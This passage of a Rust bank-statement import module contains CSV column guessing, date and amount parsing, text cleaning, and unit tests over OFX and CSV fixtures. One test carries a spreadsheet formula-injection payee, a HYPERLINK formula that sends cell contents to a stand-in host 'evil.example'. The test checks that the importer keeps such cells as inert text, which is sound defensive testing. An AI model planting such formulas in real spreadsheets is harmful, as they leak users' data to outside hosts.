        .any(|k| h.contains(k)) =>
        {
            6
        }
        _ => 0,
    }
}

fn description_score(h: &str) -> u32 {
    if has_word(h, &["category", "type", "kategorie", "id"]) {
        return 0;
    }
    match h {
        "description"
        | "transaction description"
        | "verwendungszweck"
        | "narrative"
        | "buchungstext"
        | "concepto"
        | "libellé"
        | "libelle"
        | "particulars"
        | "transaction details" => 10,
        "memo" => 9,
        "reference" | "text" => 7,
        _ if has_word(h, &["description", "memo", "narrative"])
            || h.contains("verwendungszweck") =>
        {
            6
        }
        "notes" | "note" | "remarks" => 5,
        _ => 0,
    }
}

// ---- dates ------------------------------------------------------------------

/// Settle [`DateOrder::Auto`] for a whole column: day-first if any slashed
/// date's first field is over twelve, month-first otherwise.
fn resolve_order<'a>(cells: impl Iterator<Item = &'a str>, order: DateOrder) -> DateOrder {
    if order != DateOrder::Auto {
        return order;
    }
    for cell in cells {
        if slashed_fields(cell).is_some_and(|(first, _)| first > 12) {
            return DateOrder::DayFirst;
        }
    }
    DateOrder::MonthFirst
}

/// The first two fields of `A/B/YYYY` or `A-B-YY`, the only shapes whose
/// order is in doubt.
fn slashed_fields(text: &str) -> Option<(u32, u32)> {
    let head = text.trim().split(|c: char| c.is_whitespace() || c == 'T').next()?;
    let sep = if head.contains('/') {
        '/'
    } else if head.contains('-') {
        '-'
    } else {
        return None;
    };
    let parts: Vec<&str> = head.split(sep).collect();
    if parts.len() != 3
        || parts[0].len() > 2
        || parts.iter().any(|p| p.is_empty() || !p.bytes().all(|b| b.is_ascii_digit()))
    {
        return None;
    }
    Some((parts[0].parse().ok()?, parts[1].parse().ok()?))
}

/// A day, in any of the shapes the module doc lists. `order` decides
/// slashed dates; [`DateOrder::Auto`] here is month-first, since a column's
/// order is settled before its cells are read.
fn parse_date(text: &str, order: DateOrder) -> Option<Date> {
    let t = text.trim();
    if t.is_empty() || t.chars().count() > 40 {
        return None;
    }
    if let Some(day) = numeric_date(t, order).or_else(|| named_date(t)) {
        return Some(day);
    }
    // A time after the day: "2026-10-03T12:00:00", "10/03/2026 12:00",
    // "Oct 3, 2026 9:15 AM". Cut at the token the first colon is in.
    let colon = t.find(':')?;
    let (day_part, _) = t[..colon].rsplit_once(|c: char| c.is_whitespace() || c == 'T')?;
    let day_part = day_part.trim();
    numeric_date(day_part, order).or_else(|| named_date(day_part))
}

fn looks_like_date(text: &str) -> bool {
    parse_date(text, DateOrder::MonthFirst).is_some()
        || parse_date(text, DateOrder::DayFirst).is_some()
}

/// Something with a digit and a decimal point, a sign or accounting
/// parentheses that reads as an amount and not as a date -- so a column of
/// check numbers or ids is not mistaken for the amounts.
fn looks_like_amount(text: &str) -> bool {
    !text.is_empty()
        && text.chars().any(|c| c.is_ascii_digit())
        && (text.contains('.')
            || text.contains(',')
            || text.starts_with('-')
            || text.starts_with('('))
        && !looks_like_date(text)
        && amount_of(text, "USD").is_some()
}

/// `YYYYMMDD`, `YYYY-MM-DD`, `YYYY/MM/DD`, `A/B/YYYY`, `A-B-YY`, `DD.MM.YYYY`.
fn numeric_date(t: &str, order: DateOrder) -> Option<Date> {
    if t.len() == 8 && t.bytes().all(|b| b.is_ascii_digit()) {
        return ymd(t[..4].parse().ok()?, t[4..6].parse().ok()?, t[6..].parse().ok()?);
    }
    let sep = t.chars().find(|c| !c.is_ascii_digit())?;
    if !matches!(sep, '-' | '/' | '.') {
        return None;
    }
    let parts: Vec<&str> = t.split(sep).collect();
    if parts.len() != 3
        || parts.iter().any(|p| p.is_empty() || !p.bytes().all(|b| b.is_ascii_digit()))
    {
        return None;
    }
    let (a, b, c) = (parts[0], parts[1], parts[2]);
    if a.len() == 4 {
        if b.len() > 2 || c.len() > 2 {
            return None;
        }
        return ymd(a.parse().ok()?, b.parse().ok()?, c.parse().ok()?);
    }
    if a.len() > 2 || b.len() > 2 || !(c.len() == 2 || c.len() == 4) {
        return None;
    }
    let year = full_year(c)?;
    let (first, second): (u32, u32) = (a.parse().ok()?, b.parse().ok()?);
    // A dotted date is day-first everywhere it is written.
    let day_first = sep == '.' || order == DateOrder::DayFirst;
    let (month, day) = if day_first { (second, first) } else { (first, second) };
    ymd(year, month, day)
}

/// `Oct 3, 2026`, `October 3 2026`, `3 Oct 2026`, `03-Oct-26`, `Oct. 3rd, 2026`.
fn named_date(t: &str) -> Option<Date> {
    let spaced: String =
        t.chars().map(|c| if matches!(c, ',' | '-' | '/' | '.') { ' ' } else { c }).collect();
    let tokens: Vec<&str> = spaced.split_whitespace().collect();
    if tokens.len() != 3 {
        return None;
    }
    let (month, day, year) = match month_number(tokens[0]) {
        Some(month) => (month, tokens[1], tokens[2]),
        None => (month_number(tokens[1])?, tokens[0], tokens[2]),
    };
    let day: u32 = day.trim_end_matches(|c: char| c.is_ascii_alphabetic()).parse().ok()?;
    if !(year.len() == 2 || year.len() == 4) || !year.bytes().all(|b| b.is_ascii_digit()) {
        return None;
    }
    ymd(full_year(year)?, month, day)
}

fn month_number(token: &str) -> Option<u32> {
    const MONTHS: [&str; 12] = [
        "january",
        "february",
        "march",
        "april",
        "may",
        "june",
        "july",
        "august",
        "september",
        "october",
        "november",
        "december",
    ];
    let t = token.to_lowercase();
    if t.chars().count() < 3 || !t.chars().all(|c| c.is_alphabetic()) {
        return None;
    }
    MONTHS.iter().position(|m| m.starts_with(t.as_str())).map(|i| i as u32 + 1)
}

/// A two-digit year is this century below 70 and the last one above.
fn full_year(text: &str) -> Option<u32> {
    let n: u32 = text.parse().ok()?;
    Some(match text.len() {
        4 => n,
        2 if n < 70 => 2000 + n,
        2 => 1900 + n,
        _ => return None,
    })
}

/// A real calendar day in a plausible year, or nothing.
fn ymd(year: u32, month: u32, day: u32) -> Option<Date> {
    if !(1900..=2200).contains(&year) || !(1..=12).contains(&month) || !(1..=31).contains(&day) {
        return None;
    }
    Date::new(year as i16, month as i8, day as i8).ok()
}

// ---- amounts and text -------------------------------------------------------

/// Minor units of `currency`, through [`parse_decimal`] -- and, for the
/// continental `1.234,56` it will not guess at, once more with the dots
/// taken out and the one comma made the point, only when the comma comes
/// after every dot.
fn amount_of(raw: &str, currency: &str) -> Option<i64> {
    if let Ok(minor) = parse_decimal(raw, currency) {
        return Some(minor);
    }
    let comma = raw.rfind(',')?;
    let dot = raw.rfind('.')?;
    if dot > comma || raw.matches(',').count() != 1 {
        return None;
    }
    let swapped: String =
        raw.chars().filter(|c| *c != '.').map(|c| if c == ',' { '.' } else { c }).collect();
    parse_decimal(&swapped, currency).ok()
}

/// White space folded, control and invisible formatting characters
/// dropped, cut at `max` characters.
fn clean_text(text: &str, max: usize) -> String {
    let folded = text.split_whitespace().collect::<Vec<_>>().join(" ");
    let kept: String = folded.chars().filter(|c| !c.is_control() && !is_invisible(*c)).collect();
    clip(&kept, max)
}

fn clip(text: &str, max: usize) -> String {
    if text.chars().count() <= max {
        return text.to_string();
    }
    text.chars().take(max).collect::<String>().trim_end().to_string()
}

/// A bad cell, quoted back short.
fn shown(text: &str) -> String {
    format!("{:?}", clip(text, QUOTE_LIMIT))
}

fn count(n: usize) -> u32 {
    u32::try_from(n).unwrap_or(u32::MAX)
}

fn find_ignoring_case(hay: &str, needle: &str) -> Option<usize> {
    let (h, n) = (hay.as_bytes(), needle.as_bytes());
    if n.is_empty() || h.len() < n.len() {
        return None;
    }
    h.windows(n.len()).position(|w| w.eq_ignore_ascii_case(n))
}

fn count_ignoring_case(hay: &str, needle: &str) -> usize {
    let (h, n) = (hay.as_bytes(), needle.as_bytes());
    if n.is_empty() || h.len() < n.len() {
        return 0;
    }
    h.windows(n.len()).filter(|w| w.eq_ignore_ascii_case(n)).count()
}

/// Problems, kept to [`MAX_PROBLEMS`] as they arrive so that a file of
/// fifty thousand bad lines costs twenty strings, not fifty thousand.
#[derive(Default)]
struct Problems {
    list: Vec<String>,
    dropped: usize,
}

impl Problems {
    fn push(&mut self, problem: String) {
        if self.list.len() < MAX_PROBLEMS {
            self.list.push(problem);
        } else {
            self.dropped += 1;
        }
    }

    fn is_empty(&self) -> bool {
        self.list.is_empty()
    }

    /// The list, the last entry saying how many more there were when some
    /// had to be left out.
    fn finish(self) -> Vec<String> {
        if self.dropped == 0 {
            return self.list;
        }
        let mut list = self.list;
        let kept = MAX_PROBLEMS - 1;
        let more = self.dropped + list.len() - kept;
        list.truncate(kept);
        list.push(format!("and {more} more problems like these"));
        list
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const CHECKING: &str = include_str!("../../tests/fixtures/money/checking-sgml.ofx");
    const CARD_XML: &str = include_str!("../../tests/fixtures/money/card-xml.ofx");
    const SAVINGS_QFX: &str = include_str!("../../tests/fixtures/money/savings.qfx");
    const CARD_CSV: &str = include_str!("../../tests/fixtures/money/card-amount.csv");
    const DEBIT_CREDIT: &str = include_str!("../../tests/fixtures/money/debit-credit.csv");
    const EUROPEAN: &str = include_str!("../../tests/fixtures/money/european.csv");
    const QUOTED: &str = include_str!("../../tests/fixtures/money/quoted.csv");
    const NO_HEADER: &str = include_str!("../../tests/fixtures/money/no-header.csv");

    fn day(y: i16, m: i8, d: i8) -> Date {
        Date::new(y, m, d).unwrap()
    }

    fn amounts(lines: &[ImportedTxn]) -> Vec<i64> {
        lines.iter().map(|l| l.amount).collect()
    }

    fn payees(lines: &[ImportedTxn]) -> Vec<&str> {
        lines.iter().map(|l| l.payee.as_str()).collect()
    }

    // ---- OFX --------------------------------------------------------------

    #[test]
    fn ofx_is_told_from_csv_by_its_header_or_its_root() {
        assert_eq!(detect(CHECKING), ImportFormat::Ofx);
        assert_eq!(detect(CARD_XML), ImportFormat::Ofx);
        assert_eq!(detect(SAVINGS_QFX), ImportFormat::Ofx);
        assert_eq!(detect("<ofx><stmttrn>"), ImportFormat::Ofx);
        assert_eq!(detect(CARD_CSV), ImportFormat::Csv);
        assert_eq!(detect(EUROPEAN), ImportFormat::Csv);
    }

    #[test]
    fn an_sgml_bank_statement_is_read_whole_in_the_currency_it_states() {
        let (lines, stated, problems) = parse_ofx(CHECKING, "EUR");
        assert!(problems.is_empty(), "{problems:?}");
        assert_eq!(stated.as_deref(), Some("USD"));
        assert_eq!(lines.len(), 5);
        assert_eq!(amounts(&lines), [-4217, 250_000, -8540, -6108, -120_000]);

        let first = &lines[0];
        assert_eq!(first.date, day(2026, 10, 3));
        assert_eq!(first.payee, "WHOLE FOODS MARKET #10234");
        assert_eq!(first.description, "POS PURCHASE AUSTIN TX", "white space is folded");
        assert_eq!(first.provider_id, "202610030001");

        // Entities decoded.
        assert_eq!(lines[2].payee, "AT&T *WIRELESS");
        assert_eq!(lines[2].description, "AUTOPAY <ONLINE>");
        // The PAYEE aggregate's name, not its address.
        assert_eq!(lines[3].payee, "CITY OF AUSTIN UTILITIES");
        assert_eq!(lines[3].description, "WATER AND POWER");
        // A check with no name says which check.
        assert_eq!(lines[4].payee, "Check 1043");
        assert_eq!(lines[4].date, day(2026, 10, 27));
    }

    #[test]
    fn an_xml_card_statement_is_read_with_its_entities_and_empty_elements() {
        let (lines, stated, problems) = parse_ofx(CARD_XML, "USD");
        assert!(problems.is_empty(), "{problems:?}");
        assert_eq!(stated.as_deref(), Some("CAD"));
        assert_eq!(amounts(&lines), [-2345, 50_000, 1200, -120_499]);
        assert_eq!(
            payees(&lines),
            ["TIM HORTONS #4410", "PAYMENT - THANK YOU", "Café Olimpico & Co", "BEST BUY #0912"]
        );
        assert_eq!(lines[0].date, day(2026, 10, 4));
        assert_eq!(lines[2].description, "REFUND");
        assert_eq!(lines[3].description, "", "<MEMO/> is an empty memo");
        let ids: Vec<&str> = lines.iter().map(|l| l.provider_id.as_str()).collect();
        assert_eq!(ids, ["CC-0001", "CC-0002", "CC-0003", "CC-0004"]);
    }

    #[test]
    fn a_qfx_written_on_one_line_is_read_like_any_other() {
        let (lines, stated, problems) = parse_ofx(SAVINGS_QFX, "USD");
        assert!(problems.is_empty(), "{problems:?}");
        assert_eq!(stated.as_deref(), Some("USD"));
        assert_eq!(amounts(&lines), [321, -25_000, 100_000]);
        assert_eq!(lines[1].payee, "TRANSFER TO CHECKING");
        assert_eq!(lines[1].description, "ONLINE TRANSFER REF #88123");
        // No name: the memo is the payee, and is not said twice.
        assert_eq!(lines[2].payee, "MOBILE DEPOSIT");
        assert_eq!(lines[2].description, "");
        assert_eq!(lines[2].date, day(2026, 9, 12));
    }

    #[test]
    fn a_file_that_states_no_currency_is_read_in_the_one_given() {
        let text = "<OFX><STMTTRN><DTPOSTED>20261001<TRNAMT>-1500<NAME>Ramen</STMTTRN></OFX>";
        let (lines, stated, problems) = parse_ofx(text, "jpy");
        assert!(problems.is_empty(), "{problems:?}");
        assert_eq!(stated, None);
        assert_eq!(amounts(&lines), [-1500], "yen have no minor unit");
    }

    #[test]
    fn a_bad_ofx_transaction_is_a_problem_and_the_rest_still_arrive() {
        let text = "OFXHEADER:100\n<OFX><BANKTRANLIST>\
            <STMTTRN><DTPOSTED>20261001<TRNAMT>-1.00<NAME>Fine</STMTTRN>\
            <STMTTRN><DTPOSTED>20261341<TRNAMT>-2.00<NAME>Bad day</STMTTRN>\
            <STMTTRN><DTPOSTED>20261002<TRNAMT>lots<NAME>Bad amount</STMTTRN>\
            <STMTTRN><DTPOSTED>20261003<TRNAMT>-3.00</STMTTRN>\
            <STMTTRN><TRNAMT>-4.00<NAME>No day</STMTTRN>\
            <STMTTRN><DTUSER>20261004<TRNAMT>-5.00<NAME>Only the user's day</STMTTRN>\
            </BANKTRANLIST></OFX>";
        let (lines, _, problems) = parse_ofx(text, "USD");
        assert_eq!(payees(&lines), ["Fine", "Only the user's day"]);
        assert_eq!(problems.len(), 4, "{problems:?}");
        assert!(problems[0].starts_with("transaction 2: not a date"), "{problems:?}");
        assert!(problems[1].starts_with("transaction 3: not an amount"), "{problems:?}");
        assert!(problems[2].starts_with("transaction 4: no payee"), "{problems:?}");
        assert!(problems[3].starts_with("transaction 5: no date"), "{problems:?}");
    }

    #[test]
    fn a_second_account_in_one_file_is_left_out_and_said() {
        let text = "<OFX>\
            <STMTRS><CURDEF>USD<BANKTRANLIST>\
            <STMTTRN><DTPOSTED>20261001<TRNAMT>-1.00<NAME>Mine</STMTTRN>\
            </BANKTRANLIST></STMTRS>\
            <STMTRS><CURDEF>EUR<BANKTRANLIST>\
            <STMTTRN><DTPOSTED>20261001<TRNAMT>-9.00<NAME>Other</STMTTRN>\
            <STMTTRN><DTPOSTED>20261002<TRNAMT>-9.00<NAME>Other</STMTTRN>\
            </BANKTRANLIST></STMTRS></OFX>";
        let (lines, stated, problems) = parse_ofx(text, "USD");
        assert_eq!(payees(&lines), ["Mine"]);
        assert_eq!(
            stated.as_deref(),
            Some("USD"),
            "the second statement's currency is not the file's"
        );
        assert_eq!(problems.len(), 1, "{problems:?}");
        assert!(problems[0].contains("2 accounts") && problems[0].contains("2 from the others"));
    }

    #[test]
    fn an_ofx_file_with_nothing_in_it_says_so() {
        let (lines, _, problems) = parse_ofx("OFXHEADER:100\n<OFX></OFX>", "USD");
        assert!(lines.is_empty());
        assert_eq!(problems, ["there are no transactions in this file"]);
    }

    #[test]
    fn entities_decode_and_a_bare_ampersand_survives() {
        assert_eq!(
            decode_entities("A &amp; B &lt;C&gt; &#233;&#xE9; &quot;x&apos;"),
            "A & B <C> éé \"x'"
        );
        assert_eq!(decode_entities("BARNES & NOBLE"), "BARNES & NOBLE");
        assert_eq!(decode_entities("&bogus; &#xZZ; &"), "&bogus; &#xZZ; &");
    }

    // ---- CSV --------------------------------------------------------------

    #[test]
    fn a_card_csv_behind_a_byte_order_mark_is_guessed_and_read() {
        assert!(CARD_CSV.starts_with('\u{feff}'), "the fixture keeps its BOM");
        let mapping = guess_mapping(CARD_CSV).expect("a mapping");
        assert_eq!(
            mapping,
            CsvMapping {
                date: 0,
                amount: Some(5),
                payee: 2,
                description: Some(6),
                has_header: true,
                ..Default::default()
            }
        );
        let (lines, problems) = parse_csv(CARD_CSV, &mapping, "USD");
        assert!(problems.is_empty(), "{problems:?}");
        assert_eq!(amounts(&lines), [-1549, -4820, 35_000, -103_211, -1200]);
        assert_eq!(lines[0].date, day(2026, 10, 28), "month first");
        assert_eq!(lines[0].payee, "NETFLIX.COM");
        assert_eq!(lines[3].payee, "TRADER JOE'S #552");
        assert_eq!(lines[3].description, "big shop");
        assert!(lines.iter().all(|l| l.provider_id.is_empty()), "a CSV has no ids of its own");
    }

    #[test]
    fn negate_turns_a_card_statement_round() {
        let mapping = CsvMapping { negate: true, ..guess_mapping(CARD_CSV).unwrap() };
        let (lines, _) = parse_csv(CARD_CSV, &mapping, "USD");
        assert_eq!(amounts(&lines), [1549, 4820, -35_000, 103_211, 1200]);
    }

    #[test]
    fn money_out_and_money_in_columns_make_one_signed_amount() {
        let mapping = guess_mapping(DEBIT_CREDIT).expect("a mapping");
        assert_eq!((mapping.amount, mapping.debit, mapping.credit), (None, Some(5), Some(6)));
        assert_eq!((mapping.date, mapping.payee), (0, 3));
        let (lines, problems) = parse_csv(DEBIT_CREDIT, &mapping, "USD");
        assert!(problems.is_empty(), "{problems:?}");
        // A refund written as a negative credit is still money in.
        assert_eq!(amounts(&lines), [-1875, 41_200, -645, 2999]);
        assert_eq!(lines[0].payee, "UBER *TRIP");
        assert_eq!(lines[0].date, day(2026, 10, 30));
    }

    #[test]
    fn a_continental_file_is_read_with_semicolons_day_first_and_comma_decimals() {
        let mapping = guess_mapping(EUROPEAN).expect("a mapping");
        assert_eq!(
            (mapping.date, mapping.amount, mapping.payee, mapping.description),
            (0, Some(3), 1, Some(2))
        );
        let (lines, problems) = parse_csv(EUROPEAN, &mapping, "EUR");
        assert!(problems.is_empty(), "{problems:?}");
        let days: Vec<Date> = lines.iter().map(|l| l.date).collect();
        assert_eq!(
            days,
            [day(2026, 10, 3), day(2026, 10, 15), day(2026, 10, 25), day(2026, 10, 31)]
        );
        assert_eq!(amounts(&lines), [-4217, 345_678, -102_000, -490]);
        assert_eq!(lines[0].description, "Kartenzahlung, Filiale 4410");
        assert_eq!(lines[1].description, "Gehalt Oktober; Personalnr. 77");
        assert_eq!(lines[2].payee, "Stadtwerke München");
        // No payee: the description stands in, and is not said twice.
        assert_eq!(lines[3].payee, "Kontoführung");
        assert_eq!(lines[3].description, "");
    }

    #[test]
    fn quoted_cells_keep_their_commas_quotes_and_lines_and_a_formula_stays_text() {
        let mapping = guess_mapping(QUOTED).expect("a mapping");
        assert_eq!(
            (mapping.date, mapping.payee, mapping.amount, mapping.description),
            (0, 1, Some(3), Some(2))
        );
        let (lines, problems) = parse_csv(QUOTED, &mapping, "USD");
        assert_eq!(
            payees(&lines),
            [
                "Smith, Jones & Partners",
                "The \"Corner\" Deli",
                "=HYPERLINK(\"http://evil.example/?leak=\"&A1,\"Click me\")",
                "+SUM(1+1)",
                "Plain Row",
            ]
        );
        assert_eq!(lines[0].description, "Invoice 1001, consulting");
        assert_eq!(
            lines[1].description, "lunch with Sam",
            "a line break inside quotes is one space"
        );
        assert_eq!(lines[2].amount, 2500);
        assert_eq!(lines[3].description, "@cmd");
        // Numbered by the line of the file each starts on, the two-line
        // cell counted.
        assert_eq!(problems.len(), 2, "{problems:?}");
        assert!(problems[0].starts_with("line 8: not a date"), "{problems:?}");
        assert_eq!(problems[1], "line 9: no amount");
    }

    #[test]
    fn a_file_with_no_header_is_guessed_from_what_its_columns_hold() {
        let mapping = guess_mapping(NO_HEADER).expect("a mapping");
        assert_eq!(
            mapping,
            CsvMapping {
                date: 0,
                amount: Some(1),
                payee: 4,
                has_header: false,
                ..Default::default()
            }
        );
        let (lines, problems) = parse_csv(NO_HEADER, &mapping, "USD");
        assert!(problems.is_empty(), "{problems:?}");
        assert_eq!(amounts(&lines), [-4217, 250_000, -120_000]);
        assert_eq!(lines[2].payee, "CHECK # 1043");
    }

    #[test]
    fn a_header_below_a_preamble_is_found_and_the_preamble_skipped() {
        let text = "Account;DE12 3456\nPeriod;01/10/2026 - 31/10/2026\n\nDate;Payee;Amount\n02/10/2026;Bakery;-3,20\n";
        let mapping = guess_mapping(text).expect("a mapping");
        assert_eq!((mapping.date, mapping.payee, mapping.amount), (0, 1, Some(2)));
        let (lines, problems) = parse_csv(text, &mapping, "EUR");
        assert!(problems.is_empty(), "{problems:?}");
        assert_eq!(payees(&lines), ["Bakery"]);
        assert_eq!(lines[0].amount, -320);
    }

    #[test]
    fn a_file_whose_columns_cannot_be_told_apart_has_no_guess() {
        assert_eq!(guess_mapping("a,b\nc,d\n"), None);
        assert_eq!(guess_mapping(""), None);
        let no_amount = CsvMapping { date: 0, payee: 1, ..Default::default() };
        let (lines, problems) = parse_csv("2026-10-01,x,1\n", &no_amount, "USD");
        assert!(lines.is_empty());
        assert_eq!(problems.len(), 1, "{problems:?}");
    }

    #[test]
    fn problems_stop_at_twenty_and_say_how_many_more() {
        let mut text = String::from("Date,Payee,Amount\n");
        for n in 0..30 {
            text.push_str(&format!("not a day,Shop {n},-1.00\n"));
        }
        let mapping = guess_mapping(&text).unwrap();
        let (lines, problems) = parse_csv(&text, &mapping, "USD");
        assert!(lines.is_empty());
        assert_eq!(problems.len(), MAX_PROBLEMS);
        assert!(problems[18].starts_with("line 20:"), "{problems:?}");
        assert_eq!(problems[19], "and 11 more problems like these");

        let capped = cap_problems((0..25).map(|n| n.to_string()).collect());
        assert_eq!(capped.len(), MAX_PROBLEMS);
        assert_eq!(capped[19], "and 6 more problems like these");
        assert_eq!(cap_problems(vec!["one".into()]), ["one"]);
    }

    #[test]
    fn too_much_text_or_too_many_lines_is_refused_whole() {
        let big = "x".repeat(MAX_BYTES + 1);
        assert!(check_limits(&big, ImportFormat::Csv).is_err());
        assert!(check_limits(&big, ImportFormat::Ofx).is_err());
        let (lines, problems) = parse_csv(&big, &CsvMapping::default(), "USD");
        assert!(lines.is_empty() && problems.len() == 1);

        let row = "2026-10-01,Shop,-1.00\n";
        let many = format!("Date,Payee,Amount\n{}", row.repeat(MAX_LINES + 1));
        assert!(check_limits(&many, ImportFormat::Csv).is_err());
        let enough = format!("Date,Payee,Amount\n{}", row.repeat(MAX_LINES));
        assert!(check_limits(&enough, ImportFormat::Csv).is_ok());

        let txn = "<STMTTRN><DTPOSTED>20261001<TRNAMT>-1<NAME>x</STMTTRN>";
        let many = format!("<OFX>{}</OFX>", txn.repeat(MAX_LINES + 1));
        assert!(check_limits(&many, ImportFormat::Ofx).is_err());
        let (lines, _, problems) = parse_ofx(&many, "USD");
        assert!(lines.is_empty() && problems.len() == 1, "{problems:?}");
    }

    #[test]
    fn rows_are_counted_with_quoted_line_breaks_inside_their_cells() {
        assert_eq!(count_csv_rows("a,b\n\"x\ny\",z\n\n  \nlast"), 3);
        assert_eq!(count_csv_rows(""), 0);
    }

    // ---- dates, amounts, text ----------------------------------------------

    #[test]
    fn every_shape_of_date_a_bank_writes_is_read() {
        let want = day(2026, 10, 3);
        for text in [
            "2026-10-03",
            "2026/10/03",
            "20261003",
            "10/03/2026",
            "10/3/26",
            "10-03-2026",
            "03.10.2026",
            "3.10.26",
            "Oct 3, 2026",
            "October 3 2026",
            "Oct. 3rd, 2026",
            "3 Oct 2026",
            "03-Oct-26",
            "2026-10-03T12:00:00",
            "2026-10-03 12:00",
            "10/03/2026 23:59:59",
            "Oct 3, 2026 9:15 AM",
        ] {
            assert_eq!(parse_date(text, DateOrder::MonthFirst), Some(want), "{text:?}");
        }
        assert_eq!(parse_date("03/10/2026", DateOrder::DayFirst), Some(want));
        for bad in [
            "2026-02-30",
            "13/13/2026",
            "2026-13-01",
            "yesterday",
            "",
            "1/2",
            "99999999",
            "0000-01-01",
        ] {
            assert_eq!(parse_date(bad, DateOrder::MonthFirst), None, "{bad:?}");
        }
    }

    #[test]
    fn month_first_is_the_default_and_a_first_field_over_twelve_means_day_first() {
        assert_eq!(
            resolve_order(["10/03/2026", "11/04/2026"].into_iter(), DateOrder::Auto),
            DateOrder::MonthFirst
        );
        assert_eq!(
            resolve_order(["10/03/2026", "25/03/2026"].into_iter(), DateOrder::Auto),
            DateOrder::DayFirst
        );
        assert_eq!(
            resolve_order(["2026-10-25"].into_iter(), DateOrder::Auto),
            DateOrder::MonthFirst
        );
        assert_eq!(
            resolve_order(["25/03/2026"].into_iter(), DateOrder::MonthFirst),
            DateOrder::MonthFirst
        );
    }

    #[test]
    fn amounts_are_read_exactly_in_every_common_form() {
        assert_eq!(amount_of("1.234,56", "EUR"), Some(123_456));
        assert_eq!(amount_of("-1.020.300,00", "EUR"), Some(-102_030_000));
        assert_eq!(amount_of("1 234,56", "EUR"), Some(123_456));
        assert_eq!(amount_of("(12.00)", "USD"), Some(-1200));
        assert_eq!(amount_of("$5", "USD"), Some(500));
        assert_eq!(amount_of("12.00-", "USD"), Some(-1200));
        assert_eq!(amount_of("1,234.56", "USD"), Some(123_456));
        assert_eq!(amount_of("1.234.56", "USD"), None);
        assert_eq!(amount_of("12a34", "USD"), None);
    }

    #[test]
    fn text_loses_its_control_and_invisible_characters_and_its_extra_space() {
        assert_eq!(clean_text("  A\u{202e}B\u{0}C \t\n D\u{200b} ", 100), "ABC D");
        assert_eq!(clean_text("abcdef", 3), "abc");
        assert_eq!(clean_text(&"é".repeat(500), MAX_PAYEE).chars().count(), MAX_PAYEE);
    }

    // ---- preview ------------------------------------------------------------

    #[test]
    fn a_csv_preview_shows_the_header_the_first_rows_the_guess_and_a_sample() {
        let got = preview(CARD_CSV, None, "USD");
        assert_eq!(got.format, ImportFormat::Csv);
        assert_eq!(got.columns[0], "Transaction Date", "no byte-order mark in the name");
        assert_eq!(got.columns.len(), 7);
        assert_eq!(got.rows.len(), 5);
        assert_eq!(got.rows[0][2], "NETFLIX.COM");
        assert_eq!(got.mapping, guess_mapping(CARD_CSV));
        assert_eq!(got.sample.len(), 5);
        assert_eq!(got.lines, 5);
        assert_eq!(got.currency, None);
        assert!(got.problems.is_empty(), "{:?}", got.problems);
    }

    #[test]
    fn an_ofx_preview_says_its_currency_and_how_many_lines() {
        let got = preview(CHECKING, None, "EUR");
        assert_eq!(got.format, ImportFormat::Ofx);
        assert_eq!(got.currency.as_deref(), Some("USD"));
        assert_eq!(got.lines, 5);
        assert_eq!(got.sample.len(), 5);
        assert!(got.columns.is_empty() && got.rows.is_empty() && got.mapping.is_none());
    }

    #[test]
    fn a_preview_with_no_guess_still_shows_the_rows_and_asks_for_a_mapping() {
        let got = preview("a,b\nc,d\n", Some(ImportFormat::Csv), "USD");
        assert_eq!(got.columns, ["a", "b"]);
        assert_eq!(got.rows, [["c", "d"]]);
        assert_eq!(got.mapping, None);
        assert_eq!(got.lines, 0);
        assert_eq!(got.problems.len(), 1);

        let headless = preview("x,y\n", Some(ImportFormat::Csv), "USD");
        assert_eq!(headless.columns, ["x", "y"], "a row of words reads as a header");
        let numbers = preview("1.00,2.00\n", Some(ImportFormat::Csv), "USD");
        assert_eq!(numbers.columns, ["Column 1", "Column 2"]);
        assert_eq!(numbers.rows, [["1.00", "2.00"]]);
    }

    #[test]
    fn a_row_of_millions_of_commas_is_read_as_a_few_columns() {
        let text = format!("Date,Amount,Payee\n2026-11-01{}\n", ",".repeat(200_000));
        let preview = preview(&text, Some(ImportFormat::Csv), "USD");
        assert!(preview.columns.len() <= MAX_COLUMNS, "{} columns", preview.columns.len());
        assert!(preview.rows.iter().all(|r| r.len() <= MAX_COLUMNS));
    }
}
